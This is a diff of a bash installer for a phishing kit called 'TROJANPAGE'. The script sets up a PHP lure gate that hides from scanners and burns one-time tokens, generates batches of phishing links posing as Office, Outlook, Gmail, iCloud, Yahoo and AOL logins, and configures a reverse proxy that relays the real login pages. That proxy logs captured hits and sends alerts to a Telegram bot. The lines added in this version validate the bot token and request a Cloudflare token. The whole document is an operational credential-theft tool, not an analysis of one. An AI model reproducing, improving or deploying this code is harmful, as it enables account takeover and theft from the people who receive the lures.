@@ -1,5 +1,5 @@
 #!/bin/bash
-# 🏛️ TROJANPAGE - FULL RESTORATION + TG ALERTS (V14.8.1)
+# 🏛️ TROJANPAGE - VALIDATED GHOST EDITION (V14.8.2)
 # --------------------------------------------------------
 RED='\033[0;31m'
 GREEN='\033[0;32m'
@@ -24,16 +24,31 @@ mkdir -p /root/db/
 touch /root/db/used_tokens.txt
 chmod 777 /root/db/used_tokens.txt
 
-# --- 2. SETTINGS ---
+# --- 2. SETTINGS & VALIDATION ---
 show_header
-read -p "Enter Telegram Bot Token: " TG_TOKEN
+
+# --- TOKEN VALIDATION LOOP ---
+while true; do
+    read -p "Enter Telegram Bot Token: " TG_TOKEN
+    echo -e "${CYAN}[...] Validating Token...${NC}"
+    CHECK_TOKEN=$(curl -s "https://api.telegram.org/bot$TG_TOKEN/getMe")
+    if [[ $CHECK_TOKEN == *"\"ok\":true"* ]]; then
+        BOT_NAME=$(echo $CHECK_TOKEN | grep -oP '(?<="first_name":")[^"]*')
+        echo -e "${GREEN}[success] Connected to: $BOT_NAME${NC}"
+        break
+    else
+        echo -e "${RED}[error] Invalid Telegram Token. Please try again.${NC}"
+    fi
+done
+
 read -p "Enter Telegram Chat ID: " TG_ID
+read -p "Enter Cloudflare API Token: " CF_TOKEN
 read -p "Enter Base Domain: " USER_DOMAIN
 USER_DOMAIN=$(echo "$USER_DOMAIN" | tr -d '()[] ')
 read -p "Enter Custom Path Slug (e.g., verify): " USER_SLUG
 CLEAN_SLUG=$(echo "$USER_SLUG" | tr -dc 'a-zA-Z0-9')
 
-# --- 3. THE GATEKEEPER (ALL DOMAINS + TG ALERTS) ---
+# --- 3. THE SMART GATEKEEPER (ALL DOMAINS + TG ALERTS) ---
 mkdir -p /var/www/adobe_gui/s
 cat << EOF > /var/www/adobe_gui/s/index.php
 <?php
@@ -60,7 +75,7 @@ if (\$meta && (\$meta->hosting == true || \$meta->proxy == true)) {
     exit();
 }
 
-// C. ONE-TIME TOKEN CHECK
+// C. ONE-TIME TOKEN CHECK (THE BURNER)
 \$used_tokens = file("/root/db/used_tokens.txt", FILE_IGNORE_NEW_LINES);
 if (in_array(\$token, \$used_tokens)) {
     header("Location: https://www.microsoft.com"); 
@@ -138,61 +153,4 @@ echo -e "${BLUE}║${NC} 04 | iCloud    | https://$DOMAIN/s/?id=icloud&m=$MASK&s
 echo -e "${BLUE}║${NC} 05 | Yahoo     | https://$DOMAIN/s/?id=yahoo&m=$MASK&s=$SLUG&t=$TOKEN   ${BLUE}║${NC}"
 echo -e "${BLUE}║${NC} 06 | AOL       | https://$DOMAIN/s/?id=aol&m=$MASK&s=$SLUG&t=$TOKEN     ${BLUE}║${NC}"
 echo -e "${BLUE}╠══════════════════════════════════════════════════════════════════╣${NC}"
-echo -e "${BLUE}║${NC}  ${YELLOW}BATCH TRACKER:${NC} TOTAL: $TOTAL | ${RED}BURNED: $BURNED${NC} | ${GREEN}LIVE: $LIVE${NC}          ${BLUE}║${NC}"
-echo -e "${BLUE}╠══════════════════════════════════════════════════════════════════╣${NC}"
-echo -e "${BLUE}║${NC}  ${YELLOW}[B] NEW BATCH (50)${NC} | ${CYAN}[V] VIEW UNUSED LINKS${NC}                      ${BLUE}║${NC}"
-echo -e "${BLUE}╚══════════════════════════════════════════════════════════════════╝${NC}"
-
-read -p "Selection (ID, B, V): " USER_SEL
-
-if [[ "$USER_SEL" == "b" || "$USER_SEL" == "B" ]]; then
-    echo -e "\n${YELLOW}Select Target for Batch (office, outlook, gmail, icloud, yahoo, aol):${NC}"
-    read -p "Target: " B_TARGET
-    > /root/links_batch.txt
-    for i in {1..50}; do
-        B_T=$(tr -dc 'a-zA-Z0-9' < /dev/urandom | head -c 8)
-        B_M=$(tr -dc '0-9' < /dev/urandom | head -c 10)
-        echo "https://$DOMAIN/s/?id=$B_TARGET&m=$B_M&s=$SLUG&t=$B_T" >> /root/links_batch.txt
-    done
-    echo -e "${GREEN}[success] New Batch Generated.${NC}"; sleep 1
-elif [[ "$USER_SEL" == "v" || "$USER_SEL" == "V" ]]; then
-    echo -e "\n${GREEN}--- UNUSED LINKS ---${NC}"
-    while read -r link; do
-        T_VAL=$(echo "$link" | grep -oP 't=\K.*')
-        if ! grep -q "$T_VAL" /root/db/used_tokens.txt; then echo -e "${CYAN}$link${NC}"; fi
-    done < /root/links_batch.txt
-    read -p "Press Enter to continue..."
-fi
-
-sudo fuser -k 80/tcp 443/tcp 2>/dev/null
-pkill -9 proxy
-screen -dmS lure php -S 0.0.0.0:80 -t /var/www/adobe_gui/
-cd /root/engine/dist/ && ./proxy -config "$CONFIG"
-EOF
-
-# --- 5. CONFIG GENERATION ---
-cat << EOF > /root/config.json
-{
-  "proxyDomain": "$USER_DOMAIN",
-  "listeningAddress": "0.0.0.0",
-  "listeningPortHTTPS": 443,
-  "listeningPortHTTP": 8080,
-  "target": "login.microsoftonline.com",
-  "log": "/root/hits.json",
-  "telegramToken": "$TG_TOKEN",
-  "telegramChatId": "$TG_ID",
-  "proxyRules": [
-    {"hostname": "*.$USER_DOMAIN", "target": "login.microsoftonline.com", "type": "proxy"},
-    {"hostname": "*.office.$USER_DOMAIN", "target": "login.microsoftonline.com", "type": "proxy"},
-    {"hostname": "*.outlook.$USER_DOMAIN", "target": "outlook.live.com", "type": "proxy"},
-    {"hostname": "*.gmail.$USER_DOMAIN", "target": "accounts.google.com", "type": "proxy"},
-    {"hostname": "*.icloud.$USER_DOMAIN", "target": "www.icloud.com", "type": "proxy"},
-    {"hostname": "*.yahoo.$USER_DOMAIN", "target": "login.yahoo.com", "type": "proxy"},
-    {"hostname": "*.aol.$USER_DOMAIN", "target": "login.aol.com", "type": "proxy"}
-  ]
-}
-EOF
-
-chmod +x /root/run.sh
-sudo ln -sf /root/run.sh /usr/local/bin/Run
-echo -e "${GREEN}[success] ASCII Header Restored & Deployed. Type 'Run'.${NC}"
+echo -e "${BLUE}║${NC}  ${YELLOW}BATCH TRACKER:${NC} TOTAL: $TOTAL
